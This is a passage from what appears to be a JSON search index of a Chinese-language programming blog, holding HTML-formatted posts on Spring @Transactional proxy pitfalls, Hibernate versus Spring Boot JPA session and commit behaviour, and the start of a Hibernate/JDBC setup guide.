method<br>所以…當然就沒有代理</p>\n<p>這時候在想要怎麼新開獨立事務<br>第一篇寫得很清楚</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/38208248\" target=\"_blank\" rel=\"noopener\">玩轉Spring —— 消失的事務 - 知乎</a> 這篇文章就是講剛剛的問題，但沒有講要怎麼解決，最後我找到一篇有說要怎麼解決<br><a href=\"https://www.cnblogs.com/daimzh/p/13532990.html#业务代码层面\" target=\"_blank\" rel=\"noopener\">一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園</a>業務代碼層面這邊有程式碼例子，並且解決方法</p>\n<p>第二個例子<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Service</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DmzService</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">save</span><span class=\"params\">(A a, B b)</span> </span>&#123;</span><br><span class=\"line\">\t\tsaveB(b);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span>(propagation = Propagation.REQUIRES_NEW)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">saveB</span><span class=\"params\">(B b)</span></span>&#123;</span><br><span class=\"line\">\t\tdao.saveB(a);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>兩個@Transactional，saveB 不會新開事務<br>我覺得這個跟第一個原因很像<br>因為 AOP 代理 第一層做，但是this.saveB 會抓到原本類別 saveB method<br><strong>之前學 Spring 有聽過一個口訣，@Transactional 會抓外面優先執行</strong></p>\n<blockquote>\n<p>這邊注意遺下優先抓外面，但邏輯是比較有沒有交易連線<br>REQUIRES_NEW 會抓建立新的連線機制</p>\n</blockquote>\n<p>可以看一下交易事務:<a href=\"https://segmentfault.com/a/1190000013341344\" target=\"_blank\" rel=\"noopener\">Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否</a></p>\n<p>最近也有查到@Transactional class和 method，會優先抓 method 的@Transactional<br>沒使用 public method 也會失敗，原因是 AOP 的方法需要 public </p>\n<p><strong>要做事務處理建議使用 XXX.save()</strong><br>這邊 XXX 是指 Spring 注入的對象<br>這跟下面解決方式一樣</p>\n<blockquote>\n<p>Spring默認拋出了未檢查unchecked異常（繼承自 RuntimeException 的異常）或者 Error才回滾事務；其他異常不會觸發回滾事務，已經執行的SQL會提交掉。如果在事務中拋出其他類型的異常，但卻期望 Spring 能夠回滾事務，就需要指定 rollbackFor屬性。</p>\n</blockquote>\n<p>這邊之後有時間在探討這個問題，這篇只先記錄事務處理</p>\n<p>問題來了，這些要怎麼解決?</p>\n<h2 id=\"解決\"><a href=\"#解決\" class=\"headerlink\" title=\"解決\"></a>解決</h2><p><a href=\"https://www.cnblogs.com/daimzh/p/13532990.html#业务代码层面\" target=\"_blank\" rel=\"noopener\">一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園</a>下免有兩個方法</p>\n<ol>\n<li>自己注入自己<br>所有 AOP 需要特別建立事務，需要用這個方法比較不會遇到問題</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Service</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DmzService</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 自己注入自己</span></span><br><span class=\"line\">\t<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">\tDmzService dmzService;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">save</span><span class=\"params\">(A a, B b)</span> </span>&#123;</span><br><span class=\"line\">\t\tdmzService.saveB(b);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span>(propagation = Propagation.REQUIRES_NEW)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">saveB</span><span class=\"params\">(B b)</span></span>&#123;</span><br><span class=\"line\">\t\tdao.saveB(a);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>正規方法</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Service</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DmzService</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">save</span><span class=\"params\">(A a, B b)</span> </span>&#123;</span><br><span class=\"line\">\t\t((DmzService) AopContext.currentProxy()).saveB(b);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@Transactional</span>(propagation = Propagation.REQUIRES_NEW)</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">saveB</span><span class=\"params\">(B b)</span></span>&#123;</span><br><span class=\"line\">\t\tdao.saveB(a);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>詳細看這兩篇，解決我在 Spring 交易事務的疑惑<br>沒這兩篇的話，我可能就無法還技術債</p>\n<h2 id=\"相關交易處理\"><a href=\"#相關交易處理\" class=\"headerlink\" title=\"相關交易處理\"></a>相關交易處理</h2><p>這邊也說得很細<br><a href=\"https://segmentfault.com/a/1190000015794446\" target=\"_blank\" rel=\"noopener\">Spring 中的事務傳播 - 個人文章 - SegmentFault 思否</a></p>\n<p>希望我有時間再整理這些差別</p>\n<p>最近在想有什麼方法可以看到交易事務處理狀態<br>原本有找到用 Wireshark 抓封包看<br>看完這篇應該是不需要了 :)</p>\n<p>Hibernate 有時起事務會失敗，外層加 @Transactional 就能解決<br>這邊就放起個小彩蛋連結(我就不整理了)</p>\n<ul>\n<li><a href=\"https://toutoudnf.github.io/2016/06/26/java/hibernate%20cascade%20and%20inverse%20usage/\" target=\"_blank\" rel=\"noopener\">hibernate cascade 的坑 | 头头带你飞</a></li>\n<li><a href=\"https://www.itread01.com/p/799954.html\" target=\"_blank\" rel=\"noopener\">Hibernate4整合spring4報錯—-No Session found for current thread - IT閱讀</a></li>\n<li><a href=\"https://blog.csdn.net/wangquan1992/article/details/103068150\" target=\"_blank\" rel=\"noopener\">Spring+Hibernate No Session found for current thread异常分析_老王不让用的博客-CSDN博客</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000015794446\" target=\"_blank\" rel=\"noopener\">Spring 中的事務傳播 - 個人文章 - SegmentFault 思否</a></li>\n<li><a href=\"https://blog.csdn.net/lijing_lj928/article/details/50592808\" target=\"_blank\" rel=\"noopener\">终于解决了：No Session found for current thread_lijing_lj928的专栏-CSDN博客</a></li>\n<li><a href=\"https://www.cnblogs.com/daimzh/\" target=\"_blank\" rel=\"noopener\">程序员DMZ - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/myseries/p/12167203.html\" target=\"_blank\" rel=\"noopener\">sprin 事务注解@Transactional的实现原理（转） - myseries - 博客园</a></li>\n<li><a href=\"https://www.jianshu.com/p/a7e57bb92b72\" target=\"_blank\" rel=\"noopener\">技术分享 | 从 wireshark 看 MySQL 8.0 加密连接 - 简书</a></li>\n<li><a href=\"https://juejin.im/post/6844903650293186574\" target=\"_blank\" rel=\"noopener\">MySQL_通过binlog查看原始SQL语句 - 掘金</a></li>\n<li><a href=\"https://blog.csdn.net/jackhuclan/article/details/79298039?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight\" target=\"_blank\" rel=\"noopener\">jquery 高效实现htmlencode()与htmldecode()函数_jackhuclan的专栏-CSDN博客</a></li>\n<li><a href=\"https://blog.csdn.net/wyxz126/article/details/8752094\" target=\"_blank\" rel=\"noopener\">Showing a Spring transaction in log4j_王奕然的博客-CSDN博客</a></li>\n</ul>\n","categories":["Java"],"tags":["hibernate","transactional"]},{"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","url":"/blog/2020/09/06/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/","content":"<p>之前我有做過<a href=\"https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/\">Spring 交易事務失效 | 程式狂想筆記</a><br>我以為大概了解 Spring 交易事務原理<br>但是我又遇到奇怪問題<br>在研究了一番，終於找到一些問題</p>\n<a id=\"more\"></a>\n<h2 id=\"發現問題\"><a href=\"#發現問題\" class=\"headerlink\" title=\"發現問題\"></a>發現問題</h2><p>之前以為 Hibernate 的 save 跟 jpa save的事情差不多<br>由於公司專案是使用 SSH 框架<br>跟我練習使用 Spring boot 結果不太一樣<br>花了一些時間研究並觀察</p>\n<p>首先是 Hibernate 持久層<br>更改資料不做save 也會被儲存</p>\n<p><strong>但今天我今天進入第一個@transactional 取出來的 Entity 取進去 第二個 @transactional 做 dao.save 竟然出現錯誤<br>後來改成 update 就不會有這個問題</strong></p>\n<blockquote>\n<p>之前學 Spring boot 有聽說 save 會做判斷是否 新增/修改<br>我在 Hibernate 確實都可以用<br>但這個範例竟然錯了</p>\n</blockquote>\n<p>我後來跑去 Spring Boot JPA 發現 dao 沒有 update<br>這時候我懷疑 Hibernate 跟 JPA 不一樣<br><a href=\"https://stackoverflow.com/questions/24420572/update-or-saveorupdate-in-crudrespository-is-there-any-options-available\" target=\"_blank\" rel=\"noopener\">spring - Update or SaveorUpdate in CRUDRespository, Is there any options available - Stack Overflow</a></p>\n<h3 id=\"為什麼會發生這個問題呢-我做-update-就可以正常修改\"><a href=\"#為什麼會發生這個問題呢-我做-update-就可以正常修改\" class=\"headerlink\" title=\"為什麼會發生這個問題呢?我做 update 就可以正常修改\"></a>為什麼會發生這個問題呢?我做 update 就可以正常修改</h3><blockquote>\n<p>Persistent狀態的物件對應於資料庫中的一筆資料，物件的id值與資料的主鍵值相同，並且Session實例尚未失效，在這期間您對物件的任何狀 態變動，在Session實例關閉（close）或Transaction實例執行commit()之後，資料庫中對應的資料也會跟著更新。</p>\n<p>如果您將Session實例關閉（close），則Persistent狀態的物件會成為Detached狀態。<br>…<br>…<br>Detached狀態的物件可以使用update()方法使之與資料庫中的對應資料再度發生關聯，此時Detached狀態的物件會變為 Persistent狀態。<br>參考: <a href=\"https://openhome.cc/Gossip/HibernateGossip/EntityObjectLifeCycle.html\" target=\"_blank\" rel=\"noopener\">實體物件生命週期</a></p>\n</blockquote>\n<h3 id=\"我的Hibernate-物件變成了Detached\"><a href=\"#我的Hibernate-物件變成了Detached\" class=\"headerlink\" title=\"我的Hibernate 物件變成了Detached ???\"></a>我的Hibernate 物件變成了Detached ???</h3><p>我的Hibernate 物件變成了Detached ???<br>最後爬到這篇文章</p>\n<blockquote>\n<p>getCurrentSession得到的session是和事務綁定的session，所以：<br>1，要用getCurrentSession生產的session，就必須有事務環境，意思就是你必須在調用session方法之前，session.beginTransaction（）；就算你只是get或者query<br>2，在事務提交之後，即session.getTransaction().commit()之後，session自動關閉，所以你用getCurrentSession，只需要commit事務，不要去調用session.close()。</p>\n<p>3，你用的是ssh，spring為hibernate的current_session_context_class配置了一個SpringSessionContext來幫你管理getCurrentSession中的session，所以，你在OpenSessionInview的時候，spring就自動的幫你打開了session——&gt;你在執行用AOP包裝的事務的時候，事務就開啟了——&gt;執行你的業務方法——&gt;提交事務（注意，hibernate管理的getCurrentSession在提交事務的時候才會關閉ession，而spring提供的這個SpringSessionContext不會） ——&gt;opensessioninview關閉session。<br>從上面的執行流程可以看出，你在SSH集成的時候，如果用的是getCurrentSession的集成方式，就不能設置hibernate的current_session_context_class為thread，而應該空著，讓spring幫你。<br>參考:<a href=\"https://blog.csdn.net/qq_25843323/article/details/50286643\" target=\"_blank\" rel=\"noopener\">hibernate中创建session的两种方式方式，区别在哪里？_qq_25843323的博客-CSDN博客</a> <a href=\"/blog/2020/09/06/Hibernate-和-Spring-Boot-JPA-做-Transactional-不一樣-session-close-時機/web2.png\" title=\"備份圖\">備份圖</a></p>\n</blockquote>\n<p>Hibernate daoImpl</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> Session <span class=\"title\">getSession</span><span class=\"params\">()</span> </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.sessionFactory.getCurrentSession();  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">save</span><span class=\"params\">(T entity)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getSession().save(entity);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Spring Boot CRUDRepository<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> &lt;S extends T&gt; <span class=\"function\">S <span class=\"title\">save</span><span class=\"params\">(S entity)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">this</span>.entityInformation.isNew(entity)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.em.persist(entity);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> entity;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.em.merge(entity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我的SSH 專案使用this.sessionFactory.getCurrentSession();<br>daoImpl 裡面確實沒看到 session.close<br>上面這篇應該不是錯的<br>我也曾經改過 thread 也不能跑</p>\n<h3 id=\"Hibernate-Transactional-每做一次都會-commit-並-session-關閉\"><a href=\"#Hibernate-Transactional-每做一次都會-commit-並-session-關閉\" class=\"headerlink\" title=\"Hibernate @Transactional 每做一次都會 commit 並 session 關閉\"></a>Hibernate @Transactional 每做一次都會 commit 並 session 關閉</h3><p>上面說明總結，因為 session 使用 <code>getCurrentSession();</code><br>@Transactional 會依照 session 規則，最後會做 commit<br>Hibernate 連線會自動關閉(session.close)<br><strong>注意這邊我講的是我公司專案，不是 Spring Boot JPA</strong></p>\n<p>所以之前我不了解規則，有時候會出現 No session 問題<br>但是 Spring Boot JPA 就沒有這個問題<br>現在猜測我之前是遇到這個問題</p>\n<p>以下可能是錯誤資訊，發現錯誤會修正 ============</p>\n<h3 id=\"Spring-Boot-JPA-save-使用-Transactional-不會做-commit\"><a href=\"#Spring-Boot-JPA-save-使用-Transactional-不會做-commit\" class=\"headerlink\" title=\"Spring Boot JPA save 使用 @Transactional 不會做 commit?\"></a>Spring Boot JPA save 使用 @Transactional 不會做 commit?</h3><p>下面刪掉的跳過，應該是 Spring 傳播事務不會 commit<br>重複 REQUIRED 兩層不會 commit，原因是兩層都是使用同一個交易<br>之前 @Transactional 失效問題可能是這裡面提到問題<a href=\"https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/\">Spring 交易事務失效 | 程式狂想筆記</a><br>之前我也不是很熟….</p>\n<p>簡單來刷，@Transactional 下面那一層不會 commit，但是他有做 flush 動作<br>@Transactional 回到上一層結束時候，才會做 commit<br>但 Spring Boot JPA commit時候，並不會像 Session 一樣會 close 掉<br>這一點真的很方便</p>\n<p>Hibernate 連線問題不確定<a href=\"https://thorben-janssen.com/hibernate-tips-access-hibernate-apis-jpa/\" target=\"_blank\" rel=\"noopener\">Hibernate Tips: How to access Hibernate APIs from JPA</a><br>能不能解決</p>\n<p><del>看這邊問題，我想到 Spring 交易事務是使用AOP代理模式去做beginTransactional，最後會做<code>commit</code></del><br><del>這邊我有整理<a href=\"https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/\">Spring 交易事務失效 | 程式狂想筆記</a></del></p>\n<p><del>但Spring Boot JPA 的save 怎麼沒有 commit? 能順外面用 @Transactional 做 commit 和 rollback??</del></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> &lt;S extends T&gt; <span class=\"function\">S <span class=\"title\">save</span><span class=\"params\">(S entity)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">this</span>.entityInformation.isNew(entity)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.em.persist(entity);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> entity;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.em.merge(entity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>主要就是判斷這個對象數據庫裡面是否存在，如果存在則更新， 如果是不存在則新增；根據事務的傳播性，在執行persist或者merge操作之後並不會直接提交事務。而是在所有循環保存之後@Transaction註解會統一flush,commit事務 ,下面介紹關於EntityManager常用API</p>\n</blockquote>\n<p><a href=\"https://www.cnblogs.com/wenq001/p/9264861.html\" target=\"_blank\" rel=\"noopener\">springboot jpa 批量保存數據–EntityManager和 JpaRepository - WenQ001 - 博客園</a></p>\n<p><del>這邊有提到使用<strong>persist 或者 merge 操作之後並不會直接提交事務</strong></del></p>\n<p>這邊我會錯意，其實我寫這一段覺得還是哪裡怪怪的<br>後來查了一下<br>應該是 Spring 事務傳播</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000013341344\" target=\"_blank\" rel=\"noopener\">Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否</a>  <a href=\"/blog/2020/09/06/Hibernate-和-Spring-Boot-JPA-做-Transactional-不一樣-session-close-時機/web6.png\" title=\"備份圖\">備份圖</a><br>這篇寫得很棒!!</li>\n<li><a href=\"https://www.jianshu.com/p/1533f0f5241a\" target=\"_blank\" rel=\"noopener\">Spring声明式事务管理之二：核心接口API - 簡書</a></li>\n<li><a href=\"https://stackoverflow.com/questions/19396563/does-hibernates-session-close-automatically-rollback-uncommitted-transactions\" target=\"_blank\" rel=\"noopener\">java - Does Hibernate’s Session.close() automatically rollback uncommitted transactions? - Stack Overflow</a></li>\n<li><a href=\"https://blog.csdn.net/qq_23476319/article/details/56043282\" target=\"_blank\" rel=\"noopener\">HibernateTransactionManager和DataSourceTransactionManager_qq_23476319的博客-CSDN博客</a></li>\n</ul>\n<h3 id=\"Hibernate-的-commit-flush\"><a href=\"#Hibernate-的-commit-flush\" class=\"headerlink\" title=\"Hibernate 的 commit, flush\"></a>Hibernate 的 commit, flush</h3><ul>\n<li><a href=\"https://openhome.cc/Gossip/HibernateGossip/PersistenceContext.html\" target=\"_blank\" rel=\"noopener\">Persistence Context</a></li>\n<li><a href=\"https://www.javatt.com/p/97654\" target=\"_blank\" rel=\"noopener\">Hibernate —— flush和commit的区别 - Java天堂</a></li>\n</ul>\n<h3 id=\"什麼是-persist-merge\"><a href=\"#什麼是-persist-merge\" class=\"headerlink\" title=\"什麼是 persist , merge?\"></a>什麼是 persist , merge?</h3><p>這邊沒研究很清楚，<code>Spring Boot JPA save 使用 @Transactional 不會做 commit?</code><br>好像就是這個問題，不會影響到</p>\n<p>有看到使用就一定要做事務，不然沒有效果</p>\n<p>這邊整理相關連結</p>\n<ol>\n<li><a href=\"https://www.cnblogs.com/wenq001/p/9264861.html\" target=\"_blank\" rel=\"noopener\">springboot jpa 批量保存數據–EntityManager和 JpaRepository - WenQ001 - 博客園</a></li>\n<li><a href=\"https://stackoverflow.com/questions/161224/what-are-the-differences-between-the-different-saving-methods-in-hibernate\" target=\"_blank\" rel=\"noopener\">java - What are the differences between the different saving methods in Hibernate? - Stack Overflow</a></li>\n<li><a href=\"https://blog.csdn.net/u010739551/article/details/47253881\" target=\"_blank\" rel=\"noopener\">Hibernate save()与persist()区别_攻城狮Luke（刘健彬）-CSDN博客</a></li>\n<li><a href=\"http://www.blogjava.net/dreamstone/archive/2007/07/29/133071.html\" target=\"_blank\" rel=\"noopener\">hibernate的各种保存方式的区别 (save,persist,update,saveOrUpdte,merge,flush,lock)等 - DANCE WITH JAVA - BlogJava</a> <a href=\"/blog/2020/09/06/Hibernate-和-Spring-Boot-JPA-做-Transactional-不一樣-session-close-時機/web4.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://sites.google.com/site/hzg139/home/orm-jihibernate/hibernate/hibernate\" target=\"_blank\" rel=\"noopener\">Hibernate各种保存方式的区别 - 不發光的螢火蟲</a> <a href=\"/blog/2020/09/06/Hibernate-和-Spring-Boot-JPA-做-Transactional-不一樣-session-close-時機/web3.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://www.cnblogs.com/xiaoheike/p/5374613.html\" target=\"_blank\" rel=\"noopener\">Hibernate save, saveOrUpdate, persist, merge, update 区别 - xiaoheike - 博客园</a> <a href=\"/blog/2020/09/06/Hibernate-和-Spring-Boot-JPA-做-Transactional-不一樣-session-close-時機/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://github.com/xiaoheike/HibernateSavePersistUpdateMergeDiff\" target=\"_blank\" rel=\"noopener\">xiaoheike/HibernateSavePersistUpdateMergeDiff</a></li>\n</ol>\n<h2 id=\"try-catch-到底能不能抓到-Transactional-public-method\"><a href=\"#try-catch-到底能不能抓到-Transactional-public-method\" class=\"headerlink\" title=\"try catch 到底能不能抓到 @Transactional public method ?\"></a>try catch 到底能不能抓到 @Transactional public method ?</h2><p>先說一下問題，我因為上面敘述，我接觸專案 DaoImpl.java 是使用 Hibernate<br>我接觸到的專案是不會抓到 try catch &lt;—這邊指的是 dao.save 會抓到<br>非使用 Spring Boot JPA 的 try catch 抓地到<br>所以我這邊操作出來竟然測出兩種不一樣解果</p>\n<p>Spring Boot JPA 使用 try catch(內層)抓地到 Exception &lt;—這邊指的是 dao.save 丟的 Exception 不是一般 Exception</p>\n<p>那為什麼會不一樣呢?</p>\n<p>這邊我目前猜測是 @Transactional 的關係<br>Spring Boot JPA 裡面 .save 就有包一層 @Transactional 所以結束會 flush<br>但是我目前接觸到的 DaoImpl.java 就沒有這一層<br>所以這是目前最有可能的</p>\n<h3 id=\"try-catch-觀察\"><a href=\"#try-catch-觀察\" class=\"headerlink\" title=\"try catch 觀察\"></a>try catch 觀察</h3><p>只要進入到 @Transactional<br>就可以抓到這個<br>2020-09-08 21:42:01.333 TRACE 27527 — [nio-8080-exec-1] o.s.t.i.TransactionInterceptor           : Completing transaction for [org.springframework.data.jpa.repository.support.SimpleJpaRepository.save] after exception: javax.persistence.PersistenceException: org.hibernate.exception.DataException: could not execute statement</p>\n<p>Completing  中文翻譯是「完成中」</p>\n<p><a href=\"https://github.com/spring-projects/spring-framework/blob/673f83e388e5ee992340a623de5a248e95b94c34/spring-tx/src/main/java/org/springframework/transaction/interceptor/TransactionAspectSupport.java\" target=\"_blank\" rel=\"noopener\">spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework</a></p>\n<p>當前事務發生錯誤<br>2020-09-08 21:42:01.362 DEBUG 27527 — [nio-8080-exec-1] o.s.orm.jpa.JpaTransactionManager        : Initiating transaction rollback</p>\n<p>操作 commit 會看到 Initiating transaction commit</p>\n<p>其實只要進入到 @Transactional 都會判斷當下使用哪一種事務方法<br>會依據程式碼使用和當下是否有交易連線去做</p>\n<p>相關完整可能要看程式碼…，我找不到是哪一段 flush &gt;.&lt;</p>\n<ul>\n<li><a href=\"https://github.com/spring-projects/spring-framework/blob/673f83e388e5ee992340a623de5a248e95b94c34/spring-tx/src/main/java/org/springframework/transaction/interceptor/TransactionAspectSupport.java\" target=\"_blank\" rel=\"noopener\">spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1oW41167AV?p=38\" target=\"_blank\" rel=\"noopener\">Spring源码解析_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></li>\n<li><a href=\"https://www.lagou.com/lgeduarticle/64035.html\" target=\"_blank\" rel=\"noopener\">Spring源码分析（八）深入了解事务管理的流程</a></li>\n<li><a href=\"http://www.spring4all.com/article/15684\" target=\"_blank\" rel=\"noopener\">Springboot源码分析之事务拦截和管理 | Spring For All</a></li>\n<li><a href=\"https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/html/transaction.html\" target=\"_blank\" rel=\"noopener\">17. Transaction Management</a></li>\n</ul>\n<h3 id=\"try-catch-最好寫在哪邊\"><a href=\"#try-catch-最好寫在哪邊\" class=\"headerlink\" title=\"try catch 最好寫在哪邊?\"></a>try catch 最好寫在哪邊?</h3><p><strong>外面一層</strong>，之前有看到 p3c看到<a href=\"https://github.com/alibaba/p3c\" target=\"_blank\" rel=\"noopener\">alibaba/p3c: Alibaba Java Coding Guidelines pmd implements and IDE plugin</a></p>\n<p>雖然看到網路上很多文章，都說 try catch(內層)裡面的catch 需要再 throw Exception<br>不過我測試 DAO 丟的 Exception 不管你有沒有 throw Exception<br>他還會丟一次，當然我猜非一般Dao 丟的 Exception<br>@Transactional應該不會在幫你丟，所以要自己丟</p>\n<h2 id=\"總結-心得\"><a href=\"#總結-心得\" class=\"headerlink\" title=\"總結/心得\"></a>總結/心得</h2><p>簡單來說，Spring 交易事務不管你用什麼 DB 套件，他們使用原理都是一樣的<br>我這邊不一樣的結果是 Spring boot 跟 我使用 Hibernate Dao 實作導致ˋ有不一樣結果<br>還有 Hibernate getCurrentSession 做 commit/rollback 實作會關閉交易<br>但透過 @Transactional public method 就可以正常抓到 連線，沒有的話可能要注意 commit/rollback 會遇到 no session 問題<br>當然 Spring Boot JPA應該不用煩惱</p>\n<ol>\n<li>不會有 commit/rollback 自動關掉連線</li>\n<li>save 使用 try catch 都能抓到問題</li>\n</ol>\n<p>當然除了這些問題，<a href=\"https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/\">Spring 交易事務失效 | 程式狂想筆記</a><br>裡面也要注意 @Transactional 是否有抓到 Spring AOP特性<br>往往有時候都是這些問題</p>\n<p>所以了解Spring 事務，在程式撰寫應該比較不會遇到一些問題<br>希望不會我不要在卡關<br>orz</p>\n","categories":["Java"],"tags":["hibernate","transactional","jpa","spring"]},{"title":"Hibernate 建置起手式","url":"/blog/2020/06/02/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/","content":"<p>TODO: hibernate 尚未整理完成</p>\n<a id=\"more\"></a>\n<h2 id=\"介紹-Hibernate\"><a href=\"#介紹-Hibernate\" class=\"headerlink\" title=\"介紹 Hibernate\"></a>介紹 Hibernate</h2><h2 id=\"傳統-JDBC-查詢-SQL\"><a href=\"#傳統-JDBC-查詢-SQL\" class=\"headerlink\" title=\"傳統 JDBC 查詢 SQL\"></a>傳統 JDBC 查詢 SQL</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class.forName(<span class=\"string\">\"com.mysql.jdbc.Driver\"</span>);</span><br><span class=\"line\">Connection conn = DriverManage.getConnection(url,username,password);</span><br><span class=\"line\">String sql = <span class=\"string\">\"SELECT * FROM user\"</span>;</span><br><span class=\"line\">PreparedStatment psmt = conn.prepareStatment(sql);</span><br><span class=\"line\"></span><br><span class=\"line\">ResultSet rs = pstm.executeQuery();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// while rs ....</span></span><br><span class=\"line\">conn.close();</span><br></pre></td></tr></table></figure>\n<p>一開始學 Java 我們都是這樣寫的<br>沒有仔細探討寫法</p>\n<p>首先是 Class.forName<br>因為 Class.forName 有 static 執行 <code>DriverManager.registerDriver(new Driver)</code></p>\n<p><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=52014\" target=\"_blank\" rel=\"noopener\">JWorld@TW Java論壇 - Re:請問Class.forName()的用途</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JdbcDemo</span> 